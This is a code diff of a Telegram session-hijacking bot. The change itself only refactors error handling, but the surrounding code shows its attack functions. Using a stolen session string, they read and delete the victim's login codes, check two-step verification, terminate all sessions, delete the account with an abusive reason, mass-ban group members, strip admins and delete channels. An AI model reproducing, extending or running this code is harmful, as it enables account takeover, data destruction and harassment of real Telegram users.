@@ -34,7 +34,7 @@ async def users_gc(session):
             for x in k.chats:                
                 msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** - {x.participants_count}\n\n'
             await steve.disconnect()
-                 
+
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
@@ -46,10 +46,8 @@ async def users_gc(session):
                 for x in k.chats:
                     msg += f'**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {x.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** @{x.username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {x.participants_count}\n\n'
     except Exception as idk:
-        err += str(idk)                                             
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return msg
+        err += str(idk)
+    return f"**ᴇʀʀᴏʀ:** {err}" + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**" if err else msg
  
 async def user_info(session):
     err = ""
@@ -65,7 +63,7 @@ async def user_info(session):
             k = await steve.get_me()  
             msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
             await steve.disconnect()
-                             
+
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
@@ -77,10 +75,8 @@ async def user_info(session):
                 msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
     except Exception as idk:
         err += str(idk)
-                    
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return msg    
+
+    return f"**ᴇʀʀᴏʀ:** {err}" + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**" if err else msg    
 
 
 RIGHTS = ChatBannedRights(
@@ -138,13 +134,11 @@ async def banall(session,id):
                         await asyncio.sleep(i.value)
                     except Exception as er:
                         pass 
-                          
+
     except Exception as idk:
-        err += str(idk) 
-    msg += f"**ᴜsᴇʀs ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ! \n\n ʙᴀɴɴᴇᴅ Usᴇʀs:** {bann} \n **ᴛᴏᴛᴀʟ ᴜsᴇʀs:** {all}"                                            
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return msg
+        err += str(idk)
+    msg += f"**ᴜsᴇʀs ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ! \n\n ʙᴀɴɴᴇᴅ Usᴇʀs:** {bann} \n **ᴛᴏᴛᴀʟ ᴜsᴇʀs:** {all}"
+    return f"**ᴇʀʀᴏʀ:** {err}" + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**" if err else msg
 
 async def get_otp(session):
     err = ""
@@ -162,7 +156,7 @@ async def get_otp(session):
                 i += f"\n{x.text}\n"
                 await steve.delete_dialog(777000)
             await steve.disconnect() 
-                             
+
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
@@ -177,10 +171,8 @@ async def get_otp(session):
                 await stark.delete_messages(777000,ok)
     except Exception as idk:
         err += str(idk)
-                    
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return i
+
+    return f"**ᴇʀʀᴏʀ:** {err}" + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**" if err else i
 
 async def join_ch(session,id):
     err = ""
@@ -196,7 +188,7 @@ async def join_ch(session,id):
                 print(e)
             await steve(join(gc_id))            
             await steve.disconnect() 
-                             
+
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
@@ -207,9 +199,9 @@ async def join_ch(session,id):
                 await stark.join_chat(gc_id)
     except Exception as idk:
         err += str(idk)
-                    
+
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return f"**ᴇʀʀᴏʀ:** {err}" + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return "Jᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!"
 
 async def leave_ch(session,id):
@@ -226,7 +218,7 @@ async def leave_ch(session,id):
                 print(e)
             await steve(leave(gc_id))            
             await steve.disconnect() 
-                             
+
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
@@ -237,9 +229,9 @@ async def leave_ch(session,id):
                 await stark.leave_chat(gc_id)
     except Exception as idk:
         err += str(idk)
-                    
+
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return f"**ᴇʀʀᴏʀ:** {err}" + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return "ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!"
 
 async def del_ch(session,id):
@@ -259,7 +251,7 @@ async def del_ch(session,id):
                 print(e)
             await steve(dc(gc_id))            
             await steve.disconnect() 
-                             
+
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
@@ -269,12 +261,12 @@ async def del_ch(session,id):
                     print(e)    
                 await stark.invoke(
                     functions.channels.DeleteChannel(channel= await stark.resolve_peer(gc_id)))
-            
+
     except Exception as idk:
         err += str(idk)
-                    
+
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return f"**ᴇʀʀᴏʀ:** {err}" + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return "**ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"
 
 async def check_2fa(session):
@@ -292,13 +284,13 @@ async def check_2fa(session):
             try:
                 await steve.edit_2fa("idkbsdkjsj")
                 i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"
-                
+
             except Exception as e:
                 print(e)
                 i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
-                        
+
             await steve.disconnect() 
-                             
+
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
@@ -314,10 +306,8 @@ async def check_2fa(session):
                     i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"                                                           
     except Exception as idk:
         err += str(idk)
-                    
-    if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
-    return i
+
+    return f"**ᴇʀʀᴏʀ:** {err}" + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**" if err else i
 
 async def terminate_all(session):
     err = ""
@@ -332,7 +322,7 @@ async def terminate_all(session):
                 print(e)
             await steve(rt())
             await steve.disconnect() 
-                             
+
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
@@ -343,9 +333,9 @@ async def terminate_all(session):
                 await stark.invoke(functions.auth.ResetAuthorizations())
     except Exception as idk:
         err += str(idk)
-                    
+
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return f"**ᴇʀʀᴏʀ:** {err}" + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs"
 
       
@@ -362,7 +352,7 @@ async def del_acc(session):
                 print(e)
             await steve(ok.account.DeleteAccountRequest("owner madarchod h"))
             await steve.disconnect() 
-                             
+
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                 try:
@@ -373,9 +363,9 @@ async def del_acc(session):
                 await stark.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
     except Exception as idk:
         err += str(idk)
-                    
+
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return f"**ᴇʀʀᴏʀ:** {err}" + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄ."
 
       
@@ -425,9 +415,9 @@ async def piromote(session,gc_id,user_id):
                     await stark.promote_chat_member(gc_id,user_id,PROMOTE_POWERS)
     except Exception as idk:
         err += str(idk)
-                    
+
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return f"**ᴇʀʀᴏʀ:** {err}" + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ."
 
 
@@ -460,7 +450,7 @@ async def demote_all(session,gc_id):
                     await steve.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
                 except:
                     await steve.edit_admin(gc_id, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
-          
+
             await steve.disconnect()                              
         else:    
             async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
@@ -473,8 +463,8 @@ async def demote_all(session,gc_id):
                     await stark.promote_chat_member(gc_id,m.user.id,DEMOTE)                                                                                     
     except Exception as idk:
         err += str(idk)
-                    
+
     if err:
-        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+        return f"**ᴇʀʀᴏʀ:** {err}" + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ."      
           
